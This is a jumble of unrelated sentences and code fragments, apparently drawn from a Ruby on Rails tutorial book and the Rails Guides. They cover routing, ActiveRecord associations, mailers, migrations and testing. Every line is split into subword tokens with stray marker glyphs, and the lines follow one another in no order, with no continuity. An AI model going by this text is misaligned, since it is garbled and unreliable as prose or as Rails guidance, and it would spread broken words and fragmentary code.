▁Note : ▁ Only ▁the ▁` optgroup ` ▁and ▁` option ` ▁tags ▁are ▁returned , ▁so ▁you ▁ still ▁have ▁to ▁wrap ▁the ▁output ▁in ▁an ▁appropriate ▁` select ` ▁tag .
▁ Compar e ▁this ▁to
▁To ▁see ▁it , ▁you ▁need ▁to ╼ start ▁a ▁web ▁server ▁on ▁your ▁development ▁machine ▖
▁has _ many ▁: orders , ▁-> ▁ { ▁ extending ▁Find Re c ent E x t en s ion ▁ }
▁This ▁is ▁a ▁challenging ▁section ▁and ▁can ▁be ▁skip ped ▁without ▁ lo s s ▁of ▁con t in u ity .
▁It ▁will ▁also ▁need ▁to ▁have ▁an ▁` attr _ accessor ` ▁set ▁up ╼ for ▁this ▁field , ▁so ▁that ▁the ▁set ter ▁and ▁get ter ▁methods ▁are ▁defined ▁for ▁it .
▁Next , ▁we ' ll ▁include ▁a ▁little ▁JavaScript ▁( or , ▁more ▁specifically , ▁\ href { http :// jquery ▖ com /}{ jQuery }) ▁to ▁issue ▁an ▁ alert ▁if ▁a ▁user ▁ tries ▁to ▁upload ▁an ▁image ▁that ' s ▁too ▁big ▁( which ▁prevent s ▁accidental ▁time - con sum ing ▁upload s ▁and ▁light en s ▁the ▁load ▁on ▁the ▁server ) :
▁The ▁default ▁\ k ode { Gemfile } ▁in ▁the ▁\ k ode { hello \_ app } ▁directory .
▁Find s ▁the ▁micropost ▁with ▁id ~\ k ode {1} ▁and ▁\ k ode { user \_ id } ▁equal ▁to ▁\ k ode { user ▖ id }
▁No ▁micropost ▁feed
▁If ▁this ▁is ▁the ▁case , ▁you ▁should ▁skip ▁the ▁rest ▁of ▁this ▁section .
▁As ▁with ▁account ▁activation ▁email s ▁( Section ~\ ref { sec : account _ activation _ email s }), ▁we ▁can ▁ preview ▁password ▁reset ▁email s ▁using ▁the ▁Rails ▁email ▁ preview er .
▁# ▁app / mailers / user _ mailer ▖ rb
▁( You ▁may ▁have ▁to ▁restart ▁the ▁ webserver ▁at ▁this ▁point ▖)
▁has _ many ▁: orders
▁1) ▁# ▁=> ▁ ArgumentError
▁in ▁Listing ~\ ref { code : signup _ errors _ updated } ▁and
▁If ╼ you ▁don ' t , ▁Ruby ▁libraries ▁and ▁Rails ▁will ▁often ▁be ▁able ▁to ▁convert ▁your ▁native ╼ data ▁into ▁ UT F -8 , ▁but ▁this ▁doesn ' t ▁always ▁work ▁re li ably , ▁so ▁you ' re ▁better ▁off ╼ en s ur ing ▁that ▁all ▁external ▁data ▁is ▁ UT F -8 .
▁( This ▁may ▁some times ▁give ▁an ▁error ▁indicat ing ▁a ▁failure ▁to ▁ connect ▁to ▁the ▁ Spring ▁server .
▁### ▁The ▁first ▁form
▁This ▁route ▁would ▁respond ▁to ▁paths ▁such ▁as ▁` / photos / show /1/ with _ user / 2 ` ▖
▁has _ many ▁: ph y s ic i an s , ▁through : ▁: appointment s
▁We ' ll ▁start ▁with ▁the ▁invalid ▁case ▁since ▁it ▁is ▁simple r ; ▁we ▁visit ▁the ▁signup ▁path ▁and ▁click ▁the ▁button , ▁and ▁we ▁expect ▁it ▁\ emph { not ▁to } ▁change ▁the ▁user ▁count :
▁=> ▁- 1
▁</ p >
▁> I ▁like ▁the ▁way ▁you ' ve ▁re structure d ▁that ▁code ▁in ▁generate _ find er _ sql ▁- ▁much ▁nice r ▖
▁File ▖ atomic _ write ( join ed _ asset _ path ) ▁do ▁| cache |
▁=> ▁" m z n p y b u j "
▁Defin ing ▁a ▁\ k ode { full \_ title } ▁helper .
▁( S ince ▁ screencasts ▁allow ▁for ▁a ▁more ▁ increment al ▁development ▁approach , ▁interested ▁readers ▁should ▁consider ▁the ▁\ href { http :// www ▖ railstutorial ▖ org / screencasts } { Ruby ▁on ▁Rails ▁Tutorial ▁ screencasts } ▁for ▁a ▁full er ▁understanding ▁of ▁this ▁material ▖)
▁where (" created _ at ▁< ▁? ", ▁time )
▁NOTE : ▁You ▁must ▁have ▁an ▁E x ec JS ▁supported ▁run time ▁in ▁order ▁to ▁use ▁CoffeeScript ▖╼
▁Then ▁make ▁the ▁ notification ▁optional , ▁so ▁that ▁users ▁can ▁opt ▁out ▁if ▁desired .
▁The ▁form ▁partial ▁for ▁creating ▁microposts .
▁Before ▁mov ing ▁on , ▁merge ▁your ▁changes ▁back ▁into ▁the ▁master ▁branch :
▁``` css
▁In ▁this ▁first ▁chapter , ▁we ' ll ▁get ▁started ▁with ▁Ruby ▁on ▁Rails ▁by ▁ installing ▁all ▁the ▁necessary ▁software ▁and ▁by ▁setting ▁up ▁our ▁development ▁environment ▁( Section ~\ ref { sec : up _ and _ running }) .
▁# ▁=> ▁ NoMethodError : ▁undefined ▁method ▁` limit ' ▁for ▁#< Array : 0 x 0 07 f f 34 d 3 ad 6 d 8 >
▁If ▁this ▁look s ▁ familiar , ▁it ▁should : ▁it ' s ▁just ▁Capybara , ▁which ▁is ▁included ▁by ▁default ▁in ▁Cucumber ▁step ▁files .
▁followers
▁where ▁we ▁could ▁have ▁used ▁the ▁equivalent
▁### ▁The ▁` has _ many ▁: through ` ▁Association
▁<%= ▁link _ to ▁" Delete ▁article ", ▁@ article , ▁remote : ▁true , ▁method : ▁: delete ▁%>
▁Code ▁to ▁validate ▁the ▁presence ▁of ▁micropost ▁content .
▁It ▁is ▁design ed ▁to ▁make ▁programming ▁web ▁applications ▁easier ▁by ▁making ▁as sum p tion s ╼ about ▁what ▁every ▁developer ▁needs ▁to ▁get ▁started ▖
▁In ▁the ▁process ▁of ▁getting ▁your ▁development ▁environment ▁up ▁and ▁running , ▁you ▁may ▁find ▁that ▁you ▁ s p end ▁a ▁\ emph { lo t } ▁of ▁time ▁getting ▁everything ▁just ▁right .
▁scope ▁module : ▁' admin ' ▁do
▁This ▁is ▁on ▁by ▁default ▁in ▁new ▁applications .
▁t ▖ integer ▁: supplier _ id
▁An ▁example ▁of ▁the ▁result ▁is :
▁date ▁= ▁ DateTime ▖ new (201 0, ▁6 , ▁7 , ▁ 19 , ▁ 55 , ▁ 25 )
▁We ▁then ▁ migrate ▁as ▁usual :
▁For ▁example , ▁consider ▁a ▁m ed ical ▁practice ▁where ▁ patients ▁make ▁ appointment s ▁to ▁see ▁ ph y s ic i an s ▖
▁In ▁addition ▁to ▁resource ▁routing , ▁Rails ▁has ▁powerful ▁support ▁for ▁routing ▁arbitrar y ▁URLs ▁to ▁actions ▖
▁< ul ▁id =" users ">
▁in ▁Listing ~\ ref { code : contact _ page _ test } .
▁In ▁a ▁book , ▁to ▁find ▁all ▁the ▁occur r ence s ▁of ▁a ▁given ▁string , ▁say ▁`` foobar '' , ▁you ▁would ▁have ▁to ▁ s can ▁each ▁page ▁for ▁`` foobar '' .
▁ 53 ▖ ordinal ▁# ▁=> ▁" r d "
▁Date : ▁Sun , ▁24 ▁A ug ▁2014 ▁20 : 27 : 50 ▁GMT
▁X 1 ▁= ▁: over r ide s _ X 1 _ a bo ve
▁Time ▖ utc ( 1582 , ▁10 , ▁3 ) ▁+ ▁5 ▖ day s
▁in ▁Listing ~\ ref { code : users _ migration } .
▁( Here ▁I ' ve ▁omitted ▁some ▁HTML ▁related ▁to ▁the ▁\ emph { authenticity ▁token }, ▁which ▁Rails ▁automatically ▁includes ▁to ▁ th w ar t ▁a ▁particular ▁kind ▁of ▁attack ▁called ▁a ▁\ emph { cross - site ▁request ▁ forgery } ▁( CSRF ) .
▁Configur ing ▁the ▁image ▁ uploader ▁for ▁image ▁ resizing .
▁Testing ▁for ▁a ▁ minimum ▁password ▁length ▖
▁\ href { http :// r ailscasts ▖ com /}{ RailsCasts } : ▁I ▁suggest ▁starting ▁by ▁visit ing ▁the ▁\ href { http :// r ailscasts ▖ com / episodes / archive } { RailsCasts ▁e p is ode ▁ archive } ▁and ▁click ing ▁on ▁subject s ▁that ▁catch ▁your ▁e y e .
▁create ▁app / controllers / static _ pages _ controller ▖ rb
▁It ▁m ight ▁occur ▁to ▁you ▁that ▁we ▁could ▁implement ▁the ▁\ k ode { correct \_ user } ▁filter ▁using ▁the ▁\ k ode { Micropost } ▁model ▁directly , ▁like ▁this :
▁If ▁the ▁result ing ▁lines ▁are ▁too ▁ wide , ▁say ▁200 ▁columns ▁or ▁more , ▁put ▁the ▁comment ▁above ▁the ▁call :
▁NOTE : ▁If ▁you ▁specify ▁an ▁encoding , ▁ Mail ▁will ▁assume ▁that ▁your ▁content ▁is ▁already ╼ en code d ▁and ▁not ▁try ▁to ▁ Base 64 ▁ en code ▁it .
▁Author ▖ joins (: articles )▖ where ( articles : ▁ { ▁author : ▁author ▁ })
▁> > ▁Rails ▖ env ▖ development ?
▁We ▁ protected ▁again st ▁data ▁ lo s s ▁while ▁ en a b l ing ▁collaborat ion ▁by ▁ placing ▁our ▁application ▁source ▁code ▁under ▁version ▁control ▁with ▁Git ▁and ▁push ing ▁the ▁result ing ▁code ▁to ▁a ▁ private ▁repository ▁at ▁Bitbucket .
▁before ▁and ▁after ▁the ▁execut ion ▁of
▁password : ▁ com p any ▖ smtp _ password ,
▁( As ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : a _ controller _ class }, ▁the ▁console ▁also ▁has ▁access ▁to ▁the ▁Rails ▁environment ▖)
▁To ▁copy ▁these ▁migrations ▁into ▁the ╼ application ▁use ▁this ▁command :
▁#### ▁ Range ▁Conditions
▁A ▁test ▁for ▁the ▁user ▁profile ▖
▁The ▁JavaScript ▁ embedded ▁Ruby ▁to ▁create ▁a ▁following ▁relationship .
▁As ▁noted ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁the ▁main ▁reason ▁for ▁this ▁is ▁that ▁the ▁default ▁Rails ▁page ▁typical ly ▁break s ▁at ▁Heroku , ▁which ▁make s ▁it ▁hard ▁to ▁tell ▁if ▁the ▁deployment ▁was ▁successful ▁or ▁not .
▁This ▁partial ▁introduce s ▁sever al ▁new ▁Rails ▁and ▁Ruby ▁construct s , ▁including ▁two ▁methods ▁for ▁Rails ▁error ▁objects .
▁class ▁ Foo
▁The ▁great ╼ new s ▁is ▁that ▁these ▁things ▁are ▁entire ly ▁possible , ▁because ▁a ▁Rails ▁engine ▁share s ╼ much ▁the ▁same ▁functionality ▁as ▁a ▁Rails ▁application ▖
▁' some ▁class ▁method ▁string '
▁ Each ▁element ▁in ▁the ▁cookie ▁is ▁itself ▁a ▁hash ▁of ▁two ▁elements , ▁a ▁\ k ode { value } ▁and ▁an ▁optional ▁\ k ode { expire s } ▁date .
▁user _ path (@ user ) ▁# ▁=> ▁"/ users / 3 57 - j o h n - s m i th "
▁create _ table ▁: articles ▁do ▁| t |
▁A ▁model ▁for ▁user ▁followers ▁through ▁ passive ▁relationships .
▁Code ▁for ▁an ▁example ▁user .
▁A ▁test ▁of ▁\ k ode { authenticated ?}
▁is ▁the ▁submitted ▁password .
▁The ▁` collection _ singular _ id s = ` ▁method ▁make s ▁the ▁collection ▁contain ▁only ▁the ▁objects ▁identifie d ▁by ▁the ▁supplied ▁primary ▁key ▁values , ▁by ▁adding ▁and ▁ deleting ▁as ▁appropriate .
▁We ' ll ▁see ▁another ▁example ▁in ▁Section ~\ ref { sec : a _ users _ resource } .
▁Rails ▁4 ▁now ▁uses ▁` PATCH ` ▁as ▁the ▁primary ▁HTTP ▁verb ▁for ▁update s ▁when ▁a ▁RESTful ╼ resource ▁is ▁declare d ▁in ▁` config / routes ▖ rb ` ▖
▁ SELECT ▁D IS T IN C T ▁name ▁FROM ▁clients
▁Now ▁that ▁the ▁user ▁index ▁is ▁complete , ▁there ' s ▁only ▁one ▁can on ical ▁REST ▁action ▁left : ▁\ k ode { destroy } .
▁If ▁you ▁do ▁not ▁specify ▁an ▁ alt ▁text ▁explicitly , ▁it ▁defaults ▁to ▁the ▁file ▁name ▁of ▁the ▁file , ▁ capitalize d ▁and ▁with ▁no ▁extension ▖
▁It ▁works ▁like ▁` E n um er at or # each _ with _ object ` ▁with ▁sending ▁` deep _ dup ` ▁method ▁to ▁each ▁pair ▁inside .
▁ From ▁Table ~\ ref { table : RESTful _ users }, ▁we ▁see ▁that ▁the ▁proper ▁requests ▁are ▁\ text tt { GET } ▁and ▁\ text tt { PATCH }, ▁respectively , ▁which ▁means ▁using ▁the ▁\ k ode { get } ▁and ▁\ k ode { patch } ▁methods ▁inside ▁the ▁tests .
▁class ▁ Document ▁< ▁ActiveRecord :: Base
▁# ▁T e ll ▁the ▁User Mailer ▁to ▁send ▁a ▁ welcome ▁email ▁after ▁save
▁We ' ll ▁test ▁for ▁the ▁correct ▁behavior ▁of ▁updating ▁users ▁by ▁writing ▁a ▁test ▁similar ▁to ▁the ▁one ▁show n ▁in ▁Listing ~\ ref { code : unsuccessful _ edit _ test }, ▁only ▁this ▁time ▁we ' ll ▁submit ▁valid ▁information .
▁This ▁tell s ▁the ▁` form _ for `╼ helper ▁what ▁this ▁form ▁is ▁for ▖
▁One ▁way ▁to ▁do ▁this ▁is ▁to ▁use ▁Ruby ' s ▁\ k ode { map } ▁method , ▁available ▁on ▁any ▁`` enumerable '' ▁object , ▁i ▖ e ▖ , ▁any ▁object ▁( such ▁as ▁an ▁ Array ▁or ▁a ▁ Hash ) ▁that ▁consist s ▁of ▁a ▁collection ▁of ▁elements
▁# ▁=> ▁< link ▁ href ="/ assets / all ▖ css " ▁ media =" screen " ▁ rel =" stylesheet " ▁/>
▁Here ▁\ k ode { Word ▁< ▁ String } ▁is ▁the ▁Ruby ▁syntax ▁for ▁inheritance ▁( d is c us s ed ▁brief ly ▁in ▁Section ~\ ref { sec : static _ pages }), ▁which ▁ensure s ▁that , ▁in ▁addition ▁to ▁the ▁new ▁\ k ode { palindrome ?}\ ▁method , ▁words ▁also ▁have ▁all ▁the ▁same ▁methods ▁as ▁strings :
▁There ▁may ▁be ▁time s ▁when ▁you ▁wish ▁to ▁customize ▁the ▁query ▁used ▁by ▁` has _ and _ belongs _ to _ many ` ▖
▁As ▁in ▁Section ~\ ref { sec : account _ activations _ resource }, ▁we ' ve ▁included ▁a ▁flag ▁to ▁skip ▁ generating ▁tests ▁and ▁will ▁instead ▁build ▁on ▁the ▁integration ▁test ▁from ▁Section ~\ ref { sec : activation _ test _ and _ refactoring } .
▁The ▁user ▁index ▁page ▁\ href { http :// localhost :3000/ users }{/ users } ▁with ▁pagination ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ index _ pagination _ rails _ 3 _ bootstrap - full ▖ png }{( full ▁size )}
▁╼╼ ╼ ▁\ subsection { C on str u c to rs } ▁% ▁( fold )╼ ▁\ label { sec : const ru c to rs }╼╼
▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hyper text _ Transfer _ Protocol } { HTTP } ▁is ▁a ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / State less _ proto col }{\ emph { state less ▁protocol } }, ▁treat ing ▁each ▁request ▁as ▁an ▁in dependent ▁ transaction ▁that ▁is ▁un able ▁to ▁use ▁information ▁from ▁any ▁previous ▁requests .
▁Specif y ing ▁the ╼ controller ▁with ▁Ruby ▁constant ▁notation ▁( eg ▖ ▁` controller : ▁' Admin :: User Permission s ' ` )╼ can ▁lead ▁to ▁routing ▁problem s ▁and ▁results ▁in ╼ a ▁ warning .
▁' X - Frame - Options ' ▁=> ▁' S A M E O R I G IN ',
▁The ▁default ▁Rails ▁page ▁served ▁by ▁\ k ode { rails ▁server } .
▁You ▁can ▁also ▁use ▁the ▁ ternary ▁operator ▁to ▁replace ▁assignment , ▁so ▁that
▁* ▁Implement ▁a ▁` receive ` ▁method ▁in ▁your ▁mailer .
▁A lthough ▁some ▁particular ly ▁trick y ▁steps ▁are ▁explicitly ▁highlight ed ▁in ▁the ▁text , ▁it ▁is ▁ im possibl e ▁to ▁an tic ip ate ▁all ▁the ▁things ▁that ▁can ▁go ▁wrong .
▁* ▁` lock `
▁A li ce ▁accidental ly ▁click s ▁on ▁`` S ub m it '' ▁\ emph { t w ice }, ▁sending ▁two ▁requests ▁in ▁quick ▁ success ion .
▁layout ▁" in ve n to ry "
▁* ▁` append _ asset _ paths ` ▁Find s ▁asset ▁paths ▁for ▁the ▁application ▁and ▁all ▁attached ▁ railties ▁and ▁keep s ▁a ▁ track ▁of ▁the ▁available ▁directories ▁in ▁` config ▖ static _ asset _ paths ` .
▁Like ▁\ k ode { create }, ▁\ k ode { destroy } ▁returns ▁the ▁object ▁in ▁question , ▁though ▁I ▁can ' t ▁recall ▁ever ▁ having ▁used ▁the ▁return ▁value ▁of ▁\ k ode { destroy } .
▁M u ch ▁of ▁the ▁work ▁involve d ▁in ▁signin ▁comes ▁from ▁build ing ▁this ▁cookie - base d ▁authentication ▁machinery .
▁Active ▁Record ▁provides ▁a ▁find er ▁method ▁called ▁` joins ` ▁for ▁specify ing ▁` JOIN ` ▁clause s ▁on ▁the ▁result ing ▁SQL ▖ ▁There ▁are ▁multiple ▁ways ▁to ▁use ▁the ▁` joins ` ▁method .
▁def ▁are l _ table ▁# : no doc :
▁* ▁` has _ and _ belongs _ to _ many `
▁@ @ session _ store ▁= ▁store ▖ is _ a ?(
▁You ' ve ▁he ar d ▁that ▁Rails ▁pro m o te s ▁" con ve n tion ▁over ▁configuration "▖
▁config ▖ assets ▖ en able d ▁= ▁true
▁What ▁this ▁means ▁in ▁the ▁context ▁of ▁users --- which ▁we ' re ▁now ▁think ing ▁of ▁as ▁a ▁Users ▁\ emph { resource } --- is ▁that ▁we ▁should ▁view ▁the ▁user ▁with ▁id ~\ k ode {1} ▁by ▁is s u ing ▁a ▁\ text tt { GET } ▁request ▁to ▁the ▁URL ▁ / users /1 .
▁=> ▁" Michael ▁Hartl ▁< mhartl @ example ▖ com > "
▁It ▁is ▁recommended ▁not ▁to ▁disable ▁this ▁option ▁unless ▁ strong ly ▁required , ▁since ▁this ▁works ▁as ▁a ▁security ▁me a sure ▁again st ▁setting ▁any ▁invalid ▁ locale ▁from ▁user ▁input .
▁Note ▁that ▁ RailsCasts ▁usually ▁omit ▁the ▁tests , ▁which ▁is ▁ probably ▁necessary ▁to ▁keep ▁the ▁ episodes ▁nice ▁and ▁short , ▁but ▁you ▁could ▁get ▁the ▁wrong ▁idea ▁about ▁the ▁ import ance ▁of ▁testing .
▁class ▁Blorgh :: Article ▁< ▁ActiveRecord :: Base
▁One ▁way ▁to ▁check ▁the ▁headers ▁are ▁cached ▁properly ▁in ▁your ▁CDN ▁is ▁by ▁using ▁[ curl ]( ╼ http :// explain s hell ▖ com / explain ? cm d = curl + - I + http % 3 A % 2 F % 2 F www ▖ example ▖ com )▖
▁ ╼ ▁$ ▁rails ▁generate ▁model ▁ Foo ▁bar : string ▁ baz : integer
▁remove ▁nonempty ▁directory
▁It ▁has ▁a ▁`: remote ` ▁option ▁that ▁you ▁can ▁call ▁like ▁this :
▁Use ▁` bundle ▁show ▁[ gem name ]` ▁to ▁see ▁where ▁a ▁bundle d ▁gem ▁is ▁installed .
▁\ subsection { Back t ra ce ▁ silencer } ▁% ▁( fold )╼ %
▁#### ▁ sanitize
▁(\ emph { Note } : ▁The ▁present ▁ v ol u me ▁is ▁the ▁Rails ~4▖0 ▁\ emph { version } ▁of ▁the ▁book , ▁which ▁means ▁that ▁it ▁has ▁been ▁re v is ed ▁to ▁be ▁ com p at ible ▁with ▁Rails ~4▖0 , ▁but ▁it ▁is ▁not ▁yet ▁a ▁new ▁\ emph { edition } ▁because ▁the ▁changes ▁in ▁Rails ▁don ' t ▁yet ▁just if y ▁it .
▁This ▁is ▁just ▁a ▁ sy n on y m ▁for ▁\ k ode { it }, ▁and ▁can ▁be ▁used ▁when ▁writing ▁\ k ode { it } ▁would ▁ s ound ▁un n at ur al .
▁' X - Frame - Options ' ▁=> ▁' D E N Y '
▁The ▁method ▁` transform _ keys ` ▁accept s ▁a ▁block ▁and ▁returns ▁a ▁hash ▁that ▁has ▁applied ▁the ▁block ▁operations ▁to ▁each ▁of ▁the ▁keys ▁in ▁the ▁receiver :
▁concern ▁: comment able ▁do
▁The ▁view ▁for ▁the ▁Home ▁page ▁with ▁full ▁HTML ▁structure ▖
▁` app / assets / javascripts / blorgh / articles ▖ js ` ▁and
▁ Write ▁in ▁present ▁t en se : ▁" Re t ur n s ▁a ▁hash ▁that ▖▖▖" , ▁rather ▁than ▁" Re t ur n ed ▁a ▁hash ▁that ▖▖▖" ▁or ▁" W i ll ▁return ▁a ▁hash ▁that ▖▖▖" .
▁This ▁is ▁covered ▁in ▁more ▁detail ▁in ▁[ C on fig ur ing ▁Rails ▁Application s ]( configuring ▖ html ) .
▁These ▁commands ▁tell ▁Git ▁that ▁you ▁want ▁to ▁add ▁GitHub ▁as ▁the ▁ origin ▁for ▁your ▁main ▁(\ emph { master }) ▁branch ▁and ▁then ▁push ▁your ▁repository ▁up ▁to ▁GitHub .
▁This ▁validation ▁creates ▁a ▁virtual ▁attribute ▁who se ▁name ▁is ▁the ╼ name ▁of ▁the ▁field ▁that ▁has ▁to ▁be ▁ confirmed ▁with ▁" _ confirmation " ▁ append ed .
▁" :: In f le c tion s "▖ demodulize ▁# ▁=> ▁" In f le c tion s "
▁Here , ▁you ▁don ' t ▁get ▁ groups ▁of ▁routes ▁automatically ▁generated ▁by ▁resource ful ▁routing ▖
▁* ▁` action _ dispatch ▖ configure ` ▁Configur es ▁the ▁` ActionDispatch :: Http :: URL ▖ t ld _ length ` ▁to ▁be ▁set ▁to ▁the ▁value ▁of ▁` config ▖ action _ dispatch ▖ t ld _ length ` .
▁Call ▁the ▁\ k ode { remember } ▁method ▁to ▁remember ▁the ▁given ▁user .
▁One ▁common ▁scenario ▁is ▁want ing ▁to ▁undo ▁code ▁generation --- for ▁example , ▁when ▁you ▁change ▁your ▁mind ▁on ▁the ▁name ▁of ▁a ▁controller ▁and ▁want ▁to ▁eliminate ▁the ▁generated ▁files .
▁In ▁the ▁day s ▁before ▁powerful ▁web ▁framework s ▁with ▁full ▁testing ▁cap a b i li t ies , ▁testing ▁was ▁often ▁pa in ful ▁and ▁error - prone .
▁The ▁code ▁in ▁Listing ~\ ref { code : email _ downcase } ▁passes ▁a ▁block ▁to ▁the ▁\ k ode { before \_ save } ▁callback ▁and ▁set s ▁the ▁user ' s ▁email ▁address ▁to ▁a ▁lower - case ▁version ▁of ▁its ▁current ▁value ▁using ▁the ▁\ k ode { downcase } ▁string ▁method .
▁#### # ▁` collection ▖ build ( attributes ▁= ▁ { }, ▁ ▖▖▖)
▁resources ▁: video s
▁` rails ▁server ` ▁does ▁the ▁basic ▁job ▁of ▁creating ▁a ▁` Rack :: Server ` ▁object ▁and ▁starting ▁the ▁ webserver .
▁( T h at ▁refinement ▁is ▁ preventing ▁ unactivated ▁users ▁from ▁being ▁displayed , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : activation _ resets _ exercises })▖)
▁You ▁can ▁add ▁error ▁messages ▁that ▁are ▁related ▁to ▁the ▁object ' s ▁state ▁as ▁a ▁whole , ▁instead ▁of ▁being ▁related ▁to ▁a ▁specific ▁attribute ▖
▁beginning
▁We ' ll ▁take ▁a ▁quick ▁ de tour ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby } ▁to ▁learn ▁a ▁little ▁about ▁the ▁Ruby ▁language ▁under ly ing ▁Rails .
▁To ▁use ▁the ▁feed ▁in ▁the ▁sample ▁application , ▁we ▁add ▁an ▁\ k ode {@ feed \_ items } ▁instance ▁variable ▁for ▁the ▁current ▁user ' s ▁( paginate d ) ▁feed , ▁as ▁in ▁Listing ~\ ref { code : feed _ instance _ variable }, ▁and ▁then ▁add ▁a ▁status ▁feed ▁partial ▁( Listing ~\ ref { code : feed _ partial }) ▁to ▁the ▁Home ▁page ▁( Listing ~\ ref { code : home _ with _ feed }) .
▁As ▁is ▁usually ▁the ▁case ▁with ▁Rails ▁helpers , ▁we ▁don ' t ▁need ▁to ▁know ▁any ▁details ▁about ▁the ▁implementation , ▁but ▁what ▁we ▁\ emph { do } ▁need ▁to ▁know ▁is ▁what ▁the ▁\ k ode { f } ▁object ▁does : ▁when ▁called ▁with ▁a ▁method ▁corresponding ▁to ▁an ▁\ href { http :// www ▖ w 3 school s ▖ com / html / html _ form s ▖ as p } { HTML ▁form ▁element } --- such ▁as ▁a ▁text ▁field , ▁ radio ▁button , ▁or ▁password ▁field --- it ▁returns ▁code ▁for ▁that ▁element ▁specifically ▁design ed ▁to ▁set ▁an ▁attribute ▁of ▁the ▁\ k ode {@ user } ▁object .
▁If ▁you ▁don ' t ▁specify ▁an ▁extension , ▁` ▖ css ` ▁will ▁be ▁ append ed ▁automatically .
▁"#{ module _ name } Helper "
▁( In ▁what ▁follows , ▁I ' ll ▁some times ▁ suppress ▁the ▁\ k ode { => ▁nil } ▁part ▁for ▁simplicity ▖)
▁# ▁The ▁following ▁optional ▁lines ▁are ▁part ▁of ▁the ▁advanced ▁setup .
▁The ▁password ▁reset ▁plain - text ▁email ▁template .
▁The ▁email ▁index ▁represent s ▁an ▁update ▁to ▁our ▁data ▁ modeling ▁requirements , ▁which ▁( as ▁discuss ed ▁in ▁Section ~\ ref { sec : database _ migrations }) ▁is ▁handle d ▁in ▁Rails ▁using ▁migrations .
▁Extensions ▁to ▁` Time `
▁If ▁no ▁adapter ▁is ▁set , ▁the ▁job ▁is ▁immediately ▁executed .
▁we ▁get :
▁In ▁addition , ▁when ╼ generating ▁a ▁scaffold , ▁Rails ▁will ▁put ▁some ▁ ERB ▁into ▁the ▁` _ form ▖ html ▖ erb ` ▁that ╼ it ▁generates ▁that ▁display s ▁the ▁full ▁list ▁of ▁errors ▁on ▁that ▁model .
▁#### ▁Rendering ▁ XML
▁# ▁config / application ▖ rb
▁This ▁does ▁not ▁destroy ▁the ▁objects .
▁Code ▁to ▁implement ▁ friendly ▁ forwarding .
▁if ▁some _ com p le x _ condition _ in v ol v ing _ i var s _ and _ private _ methods ?
▁< html >
▁Note : ▁with ▁the ▁ Asset ▁Pipeline ▁the ▁: cache ▁and ▁: concat ▁options ▁are n ' t ▁used ╼ any more , ▁delete ▁these ▁options ▁from ▁the ▁` javascript _ include _ tag ` ▁and ╼` stylesheet _ link _ tag ` .
▁In ▁the ▁\ k ode { setup } ▁step , ▁we ▁create ▁a ▁new ▁micropost ▁while ▁associat ing ▁it ▁with ▁a ▁valid ▁user ▁from ▁the ▁fixtures , ▁and ▁then ▁check ▁that ▁the ▁result ▁is ▁valid .
▁You ▁can ▁also ▁create ▁methods ▁that ▁verify ▁the ▁state ▁of ▁your ▁models ▁and ▁add ╼ messages ▁to ▁the ▁` errors ` ▁collection ▁when ▁they ▁are ▁invalid ▖
▁To ▁avoid ▁this ▁call , ▁you ▁can ▁add ▁a ▁ counter ▁cache ▁to ▁the ▁ _ belonging _ ▁model :
▁class ▁Create Customer s ▁< ▁ActiveRecord :: Migration
▁The ▁ core ▁of ▁the ▁micropost ▁data ▁model ▁is ▁even ▁simple r ▁than ▁the ▁one ▁for ▁users : ▁a ▁micropost ▁has ▁only ▁an ▁\ k ode { id } ▁and ▁a ▁\ k ode { content } ▁field ▁for ▁the ▁micropost ' s ▁text ▁( of ▁type ▁\ k ode { text })
▁It ▁only ▁has ▁effect ▁if ▁` config ▖ cache _ classes ` ▁is ▁true , ▁which ▁it ▁is ▁by ▁default ▁in ▁production ▁mode ▖ ╼╼
▁in ▁Listing ~\ ref { code : rails _ command } .
▁<%= ▁form _ for ▁: article ▁do ▁| f | ▁%>
▁* ▁Call ▁` render ` ▁to ▁create ▁a ▁full ▁response ▁to ▁send ▁back ▁to ▁the ▁browser
▁The ▁` collection ▖ size ` ▁method ▁returns ▁the ▁number ▁of ▁objects ▁in ▁the ▁collection .
▁As ▁a ▁rule ▁of ▁thumb , ▁` tableize ` ▁returns ▁the ▁table ▁name ▁that ▁correspond s ▁to ▁a ▁given ▁model ▁for ▁simple ▁cases ▖
▁If ▁you ▁view ▁your ▁app ▁running ▁in ▁production , ▁it ▁won ' t ▁work ▁without ▁a ▁production ▁database , ▁which ▁we ▁can ▁create ▁by ▁running ▁\ text tt { rake ▁db : migrate } ▁in ▁production :
▁The ▁default ▁error ▁messages ▁depend ▁on ▁the ▁type ▁of ▁length ▁validation ▁being ╼ perform ed ▖
▁For ▁these ▁last ▁two ▁steps ▁to ▁work , ▁we ▁need ▁to ▁have ▁enough ▁users ▁in ▁the ▁test ▁database ▁to ▁invoke ▁pagination , ▁i ▖ e ▖ , ▁more ▁than ▁30 .
▁The ▁rest ▁of ▁this ▁section ▁is ▁d ed icated ▁to ▁understanding ▁it .
▁If ▁your ▁test ▁helper ▁contains ▁a ▁call ▁to ╼` ActiveRecord :: Migration ▖ check _ pending !` ▁this ▁can ▁be ▁removed ▖
▁We ▁added ▁a ▁controller ▁action ▁and ▁ modified ▁the ▁root ▁route ▁to ▁create ▁a ▁`` hello , ▁world '' ▁application .
▁Now ▁that ▁our ▁users ▁index ▁page ▁is ▁working , ▁we ' ll ▁write ▁a ▁light we ight ▁test ▁for ▁it , ▁including ▁a ▁minimal ▁test ▁for ▁the ▁pagination ▁from ▁Section ~\ ref { sec : pagination } .
▁Rails ▁would ▁ dispatch ▁that ▁request ▁to ▁the ▁` destroy ` ▁method ▁on ▁the ▁` photos ` ▁controller ▁with ▁` { ▁id : ▁' 17 ' ▁}` ▁in ▁` params ` .
▁Tests ▁for ▁the ▁Relationship s ▁controller ▁response s ▁to ▁Ajax ▁requests .
▁This ▁method ▁works ▁with ▁ polymorphic ▁relationships ▁as ▁well .
▁It ▁is ▁equivalent ▁to ▁writing :
▁has _ many ▁: comments
▁A ▁mockup ▁of ▁the ▁users ▁index ▁with ▁delete ▁links .
▁At ▁this ▁point , ▁you ▁can ▁use ▁a ▁rake ▁command ▁to ▁run ▁the ▁migration :
